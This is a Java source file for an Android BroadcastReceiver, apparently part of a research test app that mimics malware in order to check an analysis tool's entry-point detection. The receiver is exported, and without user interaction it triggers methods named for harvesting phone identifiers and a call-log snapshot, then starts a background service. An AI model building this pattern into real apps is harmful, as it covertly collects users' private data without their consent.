package org.research.realisticmalapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/** Exported entry point reachable without user interaction (a broadcast, not
 * a launcher tap) — tests AGLL's entry-point detection against a
 * BroadcastReceiver rather than only Activity/Fragment lifecycle callbacks.
 * See ../METHODOLOGY.md. */
public final class SyncReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context context, Intent intent) {
        new TelephonyScenario().harvestPhoneIdentifiers(context);
        new TelephonyScenario().harvestCallLogSnapshot(context);
        context.startService(new Intent(context, MaintenanceService.class));
    }
}
